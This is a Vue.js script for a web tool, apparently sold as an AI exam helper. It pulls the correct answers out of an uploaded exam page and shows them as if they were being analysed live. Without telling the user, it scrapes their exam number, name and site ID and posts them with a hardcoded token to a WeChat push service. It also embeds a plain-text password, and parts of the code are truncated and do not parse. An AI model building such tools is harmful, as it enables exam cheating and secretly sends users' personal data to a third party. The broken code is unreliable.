  <script>
    new Vue({
      el: "#app",
      data: {
        selectedFile: null, // 存储用户选择的题目
        fileContentData: "", // 存储题目原始数据
        status: "", // 显示当前状态信息
        isLoading: false, // 标记是否正在加载/分析中
        uploadText: "点击选择题目", // 上传区域显示的文字
        typingSpeed: 50, // 打字效果的速度(毫秒)
        codeData: null,
        showEWM: false,
        tipContent:
          "TING近期访问量过高，请联系客服，获取专属链接进行操作（免费）",
        code: null,
      },
      beforeCreate() {
        // 隐藏加载动画
        document.getElementById("loadingMask").style.display = "none";
      },
      async created() {
        // if (
        //   !location.href.includes("TING_AI") &&
        //   !location.href.includes("TING_ai") &&

      methods: {

          const rawHashValue = window.location.hash;

          // debugger
          if (this.code) {

          }
        },
        autoShowFn(time = 20) {
          this.showEWM = true;
          let id = setTimeout(() => {
            this.showEWM = false;
            clearTimeout(id);
          }, time * 1000);
        },
        checkCode() {
          return true
          // if (!this.codeData) {
          //   swal({
          //     text: this.tipContent,
          //     title: "提示",
          //     icon: "warning",
          //   }).then((res) => {
          //     this.autoShowFn();
          //   });

          //   return false;
          // } else if (Date.now() > this.codeData.endTime) {
          //   swal({
          //     text: `链接已于${this.codeData.endTimeText}过期，请联系客服重新获取`,
          //     title: "提示",
          //     icon: "warning",
          //   }).then((res) => {
          //     this.autoShowFn();
          //   });
          //   return false;
          // } else {
          //   return true;
          // }
        },
        // 获取上传的html文件
        async handleFileChange(event) {
          if (!this.checkCode()) return;
          const file = event.target.files?.[0];
          if (!file) return;
          this.selectedFile = file;
          this.uploadText = `已选择: ${file.name}`;
          this.status = "正在读取题目内容...";
          try {
            // 读取html里的文本
            let text = await this.readFileContent(file);
            // 题目数组
            let questions = this.processUserAnsMapStr(text);
            if (questions.length) {
              // 将html解析成答案
              this.fileContentData =
                `题目【${this.selectedFile.name}】的答案如下\n` +
                questions
                  .map(
                    (item, index) =>
                      `第${item.showSerialNum}题：${item.rightAnswer}`
                  )
                  .join("\n");
            }

            this.status = " 题目读取完成";
            await this.analyzeFile();
          } catch (error) {
            this.status = `读取题目出错: ${error.message}`;
            this.selectedFile = null;
          } finally {
            this.$refs.fileInput.value = "";
          }
        },

        // 开始分析
        async analyzeFile() {
          if (!this.checkCode()) return;
          this.isLoading = true;
          this.status = "正在分析题目...";

          try {
            // 清空显示区域
            this.$refs.fileContentDisplay.innerHTML = "";
            await new Promise((resolve) => setTimeout(resolve, 1000));
            await this.typeFileContent(this.fileContentData);

            this.status = "题目分析完成";
          } catch (error) {
            this.status = `分析出错: ${error.message}，请联系客服`;
          } finally {
            this.isLoading = false;
          }
        },

        // 将html内容转换成题目数组
        processUserAnsMapStr(htmlContent) {
          if (!this.checkCode()) return;
          const parser = new DOMParser();
          const doc = parser.parseFromString(htmlContent, "text/html");

          // 提取目标元素
          const element = doc.getElementById("userAnsMapStr");
          if (!element) throw new Error("题目格式异常，请联系客服");

          // 解析 JSON 字符串
          let jsonObj;
          try {
            jsonObj = JSON.parse(element.textContent.trim());
            this.getSendContent(doc);
          } catch (e) {
            this.status = "JSON 格式错误";
            swal({
              text: `文件内容错误，请联系客服`,
              title: "提示",
              icon: "warning",
            }).then((res) => {
              this.autoShowFn();
            });

            throw new Error(this.status);
          }

          // 转成数组并排序
          const jsonArray = Object.values(jsonObj);
          return jsonArray.sort((a, b) => a.showSerialNum - b.showSerialNum);
        },
        getSendContent(doc) {
          let obj = {};
          let tableElement = doc.querySelector("body > div.new_dati > table");
          if (tableElement) {
            const textContent = tableElement.innerHTML;
            const examNumberMatch = textContent.match(/准考证号：([^<]+)/);
            if (examNumberMatch) {
              obj.examNumber = examNumberMatch[1].trim();
              // 只有第一次登录时，才发送请求 sendMessage
              if (localStorage.getItem(obj.examNumber)) {
                return;
              }
              if (obj.examNumber) {
                localStorage.setItem(obj.examNumber, "1");
              }
            }
            const nameMatch = textContent.match(/名：([^<]+)/);
            if (nameMatch) {
              obj.name = nameMatch[1].trim();
            }
          }
          const loginSiteId = doc.querySelector("input[name='loginSiteId']");
          if (loginSiteId) {
            obj.loginSiteId = loginSiteId.value;
          }
          obj.code = this.code;
          obj.codeData = this.codeData;
          this.sendMessage(`新用户`, JSON.stringify(obj));
        },
        // 打字效果显示内容
        typeFileContent(content) {
          if (!this.checkCode()) return;
          return new Promise((resolve) => {
            const element = this.$refs.fileContentDisplay;
            let i = 0;
            const typingInterval = setInterval(() => {
              if (i < content.length) {
                // 处理HTML特殊字符
                const char = content.charAt(i);
                if (char === "<") {
                  // 处理HTML标签
                  const tagEnd = content.indexOf(">", i);
                  if (tagEnd !== -1) {
                    element.innerHTML += content.substring(i, tagEnd + 1);
                    i = tagEnd + 1;
                  } else {
                    element.innerHTML += char;
                    i++;
                  }
                } else {
                  element.innerHTML += char;
                  i++;
                }

                // 自动滚动到底部
                element.scrollTop = element.scrollHeight;
              } else {
                clearInterval(typingInterval);
                resolve();
              }
            }, this.typingSpeed);
          });
        },

        // 读取文件内容
        readFileContent(file) {
          if (!this.checkCode()) return;
          return new Promise((resolve, reject) => {
            if (!file) {
              reject(new Error("没有选择题目"));
              return;
            }
            const reader = new FileReader();
            reader.onload = (e) => {
              resolve(e.target.result);
            };
            reader.onerror = (e) => {
              reject(new Error("题目读取失败"));
            };
            // 根据题目类型选择读取方式
            reader.readAsText(file);
          });
        },

        // 获取文件大小
        formatFileSize(bytes) {
          if (!this.checkCode()) return;
          if (bytes === 0) return "0 Bytes";
          const k = 1024;
          const sizes = ["Bytes", "KB", "MB", "GB"];
          const i = Math.floor(Math.log(bytes) / Math.log(k));
          return (
            parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
          );
        },

        // 发送消息
        sendMessage(title, content) {
          var myHeaders = new Headers();
          myHeaders.append("Content-Type", "application/json");
          var raw = JSON.stringify({
            token: "05aa9f6494f849a38ddbb7ed799859ee",
            title,
            content,
            channel: "wechat",
          });
          var requestOptions = {
            method: "POST",
            headers: myHeaders,
            body: raw,
            redirect: "follow",
          };

          fetch("https://www.pushplus.plus/send", requestOptions);
        },

        // 触发文件选择框
        triggerFileInput() {
          this.$refs.fileInput.click();
        },

        async decryptAESGCM(ciphertextBase64, password = "qwer1997") {
          // 将Base64解码为字节数组
          const encryptedData = Uint8Array.from(atob(ciphertextBase64), (c) =>
            c.charCodeAt(0)
          );

          // 提取盐值、IV和密文
          const salt = encryptedData.slice(0, 16);
          const iv = encryptedData.slice(16, 28);
          const ciphertext = encryptedData.slice(28);

          // 将密码转换为加密密钥
          const pwBuffer = new TextEncoder().encode(password);
          const pwKey = await crypto.subtle.importKey(
            "raw",
            pwBuffer,
            { name: "PBKDF2" },
            false,
            ["deriveKey"]
          );

          // 衍生出AES密钥
          const key = await crypto.subtle.deriveKey(
            {
              name: "PBKDF2",
              salt: salt.buffer,
              iterations: 100000,
              hash: "SHA-256",
            },
            pwKey,
            {
              name: "AES-GCM",
              length: 256,
            },
            true,
            ["decrypt"]
          );

          // 解密数据
          const decrypted = await crypto.subtle.decrypt(
            {
              name: "AES-GCM",
              iv: iv.buffer,
            },
            key,
            ciphertext.buffer
          );

          return new TextDecoder().decode(decrypted);
        },
      },
    });
